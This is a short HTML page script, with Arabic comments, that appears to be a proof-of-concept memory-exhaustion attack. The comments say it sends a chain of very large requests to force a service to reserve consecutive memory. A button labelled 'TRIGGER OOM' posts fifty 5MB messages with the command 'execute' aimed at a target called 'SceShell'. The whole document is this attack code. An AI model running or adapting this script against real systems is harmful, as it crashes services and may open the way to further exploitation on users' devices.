<script>
    // بدلاً من إرسال رسالة واحدة، سنرسل "سلسلة" من الطلبات الكبيرة جداً
    // لإجبار الـ Service على حجز ذاكرة متتالية
    let bigPayload = "A".repeat(1024 * 1024 * 5); // 5MB لكل طلب

    function triggerOOM() {
        for (let i = 0; i < 50; i++) {
            window.postMessage({
                cmd: 'execute', 
                target: 'SceShell', 
                data: bigPayload + i 
            }, '*');
        }
    }

    // زر للبدء
    document.body.innerHTML = '<button onclick="triggerOOM()" style="padding:50px; font-size:30px;">TRIGGER OOM</button>';
</script>
